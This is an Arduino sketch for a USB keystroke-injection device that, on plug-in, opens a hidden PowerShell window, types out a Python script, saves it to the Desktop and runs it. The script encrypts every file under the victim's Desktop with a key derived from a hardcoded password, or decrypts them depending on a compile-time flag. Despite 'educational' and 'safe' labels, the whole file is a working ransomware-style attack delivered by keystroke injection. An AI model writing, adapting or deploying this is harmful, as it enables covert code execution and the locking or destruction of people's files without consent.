#include <Arduino.h>
#include "USB.h"
#include "USBHIDKeyboard.h"

USBHIDKeyboard Keyboard;

// Change this to "e" for encrypt or "d" for decrypt before flashing
const char* MODE = "d";

void typeLine(const char* line) {
  Keyboard.print(line);
  Keyboard.write(KEY_RETURN);
  delay(0);
}

void setup() {
  USB.begin();
  Keyboard.begin();
  delay(500);

  // Launch hidden PowerShell
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print("powershell -WindowStyle Hidden");
  Keyboard.write(KEY_RETURN);
  delay(200);

  // Begin here-string
  typeLine("@\"");

  // Python script with auto-install
  typeLine("import os, sys, time, base64, shutil, subprocess");
  typeLine("try:");
  typeLine("    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC");
  typeLine("    from cryptography.fernet import Fernet");
  typeLine("    from cryptography.hazmat.primitives import hashes");
  typeLine("    from cryptography.hazmat.backends import default_backend");
  typeLine("except ImportError:");
  typeLine("    print('[!] cryptography not found. Installing...')");
  typeLine("    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'cryptography'])");
  typeLine("    print('[+] Installed. Restarting script...')");
  typeLine("    os.execv(sys.executable, [sys.executable] + sys.argv)");
  typeLine("");
  typeLine("TARGET_FOLDER = os.path.join(os.path.expanduser('~'), 'Desktop')");
  typeLine("SALT = b'educational_demo_salt!'");
  typeLine("ITERATIONS = 390000");
  typeLine("KEY_FILE = 'keyfile.key'");
  typeLine("KEY_BACKUP_FILE = os.path.expanduser('~/Documents/keyfile_backup.key')");
  typeLine("LOG_FILE = 'encryptor.log'");
  typeLine("PASSWORD = '12345678'");
  typeLine(("MODE = '" + String(MODE) + "'").c_str()); // FIXED LINE
  typeLine("");
  typeLine("def log(msg):");
  typeLine("    with open(LOG_FILE, 'a', encoding='utf-8') as f:");
  typeLine("        f.write(f\"{time.strftime('%Y-%m-%d %H:%M:%S')} - {msg}\\n\")");
  typeLine("    print(msg)");
  typeLine("");
  typeLine("def derive_key(password, salt):");
  typeLine("    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=ITERATIONS, backend=default_backend())");
  typeLine("    return base64.urlsafe_b64encode(kdf.derive(password.encode()))");
  typeLine("");
  typeLine("def save_key(key):");
  typeLine("    with open(KEY_FILE, 'wb') as f: f.write(key)");
  typeLine("    log(f'[+] Key saved to {KEY_FILE}')");
  typeLine("    try:");
  typeLine("        os.makedirs(os.path.dirname(KEY_BACKUP_FILE), exist_ok=True)");
  typeLine("        shutil.copy2(KEY_FILE, KEY_BACKUP_FILE)");
  typeLine("        log(f'[+] Backup key saved to {KEY_BACKUP_FILE}')");
  typeLine("    except Exception as e:");
  typeLine("        log(f'[!] Failed to backup key: {e}')");
  typeLine("");
  typeLine("def load_key():");
  typeLine("    with open(KEY_FILE, 'rb') as f: key = f.read()");
  typeLine("    log(f'[+] Key loaded from {KEY_FILE}')");
  typeLine("    return key");
  typeLine("");
  typeLine("def get_all_files(folder):");
  typeLine("    paths = []");
  typeLine("    for root, _, files in os.walk(folder):");
  typeLine("        for file in files:");
  typeLine("            path = os.path.join(root, file)");
  typeLine("            if os.path.abspath(path) != os.path.abspath(KEY_FILE):");
  typeLine("                paths.append(path)");
  typeLine("    return paths");
  typeLine("");
  typeLine("def progress_bar(current, total):");
  typeLine("    percent = int((current / total) * 100)");
  typeLine("    bar = '#' * (percent // 2) + '-' * (50 - percent // 2)");
  typeLine("    sys.stdout.write(f\"\\r[{bar}] {percent}%\")");
  typeLine("    sys.stdout.flush()");
  typeLine("");
  typeLine("def encrypt_folder(folder, fernet):");
  typeLine("    files = get_all_files(folder)");
  typeLine("    total = len(files)");
  typeLine("    for i, path in enumerate(files, 1):");
  typeLine("        try:");
  typeLine("            with open(path, 'rb') as f: data = f.read()");
  typeLine("            with open(path, 'wb') as f: f.write(fernet.encrypt(data))");
  typeLine("            log(f'[+] Encrypted: {path}')");
  typeLine("        except Exception as e:");
  typeLine("            log(f'[!] Failed to encrypt {path}: {e}')");
  typeLine("        progress_bar(i, total)");
  typeLine("    print()");
  typeLine("");
  typeLine("def decrypt_folder(folder, fernet):");
  typeLine("    files = get_all_files(folder)");
  typeLine("    total = len(files)");
  typeLine("    for i, path in enumerate(files, 1):");
  typeLine("        try:");
  typeLine("            with open(path, 'rb') as f: data = f.read()");
  typeLine("            dec = fernet.decrypt(data)");
  typeLine("            with open(path, 'wb') as f: f.write(dec)");
  typeLine("            log(f'[-] Decrypted: {path}')");
  typeLine("        except Exception as e:");
  typeLine("            log(f'[!] Failed to decrypt {path}: {e}')");
  typeLine("        progress_bar(i, total)");
  typeLine("    print()");
  typeLine("");
  typeLine("if __name__ == '__main__':");
  typeLine("    os.makedirs(TARGET_FOLDER, exist_ok=True)");
  typeLine("    log('=== Safe Dual-Mode Started ===')");
  typeLine("    if os.path.exists(KEY_FILE):");
  typeLine("        log('[*] Key file found.')");
  typeLine("        key = load_key()");
  typeLine("    else:");
  typeLine("        key = derive_key(PASSWORD, SALT)");
  typeLine("        save_key(key)");
  typeLine("    fernet = Fernet(key)");
  typeLine("    if MODE == 'e':");
  typeLine("        encrypt_folder(TARGET_FOLDER, fernet)");
  typeLine("    elif MODE == 'd':");
  typeLine("        decrypt_folder(TARGET_FOLDER, fernet)");
  typeLine("    else:");
  typeLine("        log('[!] Invalid mode.')");
  typeLine("    log('=== Process Finished ===')");

  // End here-string & save file
  typeLine("\"@ | Set-Content $env:USERPROFILE\\Desktop\\safe_dual_mode.py");

  // Run the script
  typeLine("python $env:USERPROFILE\\Desktop\\safe_dual_mode.py");
  typeLine("exit");
}

void loop() {}
